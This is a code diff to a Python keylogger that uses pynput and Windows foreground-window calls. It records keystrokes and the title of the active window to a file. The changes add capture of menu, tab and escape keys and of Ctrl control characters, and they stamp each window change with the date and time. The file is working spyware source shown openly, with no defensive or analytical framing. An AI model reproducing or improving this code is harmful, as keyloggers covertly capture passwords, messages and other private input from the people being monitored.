@@ -2,6 +2,7 @@ import pynput
 import base64
 import random
 import string
+import datetime
 import threading
 import os
 from pynput import keyboard
@@ -16,6 +17,9 @@ def log():
     # print statements for when mods are used
     mods = {
         "Key.space": " {sp} ",
+        "Key.menu": " {menu} ",
+        "Key.tab": " {tab} ",
+        "Key.esc": " {esc} ",
         "Key.backspace": " {bsp} ",
         "Key.enter": " {ent} ",
         "Key.caps_lock": " {cLok} ",
@@ -26,6 +30,33 @@ def log():
         "Key.alt_r": " {ralt}",
         "Key.shift": " {sft} ",
         "Key.cmd": " {cmd} ",
+        # control characters
+        "\\x01": " {^a} ",
+        "\\x02": " {^b} ",
+        "\\x03": " {^c} ",
+        "\\x04": " {^d} ",
+        "\\x05": " {^e} ",
+        "\\x06": " {^f} ",
+        "\\x07": " {^g} ",
+        "\\x08": " {^h} ",
+        "\\x09": " {^i} ",
+        "\\x0A": " {^j} ",
+        "\\x0B": " {^k} ",
+        "\\x0C": " {^l} ",
+        "\\x0D": " {^m} ",
+        "\\x0E": " {^n} ",
+        "\\x0F": " {^o} ",
+        "\\x10": " {^p} ",
+        "\\x11": " {^q} ",
+        "\\x12": " {^r} ",
+        "\\x13": " {^s} ",
+        "\\x14": " {^t} ",
+        "\\x15": " {^u} ",
+        "\\x16": " {^v} ",
+        "\\x17": " {^w} ",
+        "\\x18": " {^x} ",
+        "\\x19": " {^y} ",
+        "\\x1A": " {^z} ",
     }
     # print statements for when mods are released
     mods_r = {
@@ -44,9 +75,11 @@ def log():
         global currentwindow
         checkwindow = (GetWindowText(GetForegroundWindow()))
         if currentwindow != checkwindow:
+            now = datetime.datetime.now()
+            now_f = now.strftime("%Y-%m-%d %H:%M:%S")
             with open(fname, "a+") as f:
                 f.write("\n\n")
-                f.write(f"### Window Changed to \"{checkwindow}\" ###")
+                f.write(f"### Window Changed to \"{checkwindow}\" @ {now_f} ###")
                 f.write("\n")
             currentwindow = checkwindow
         kl = []
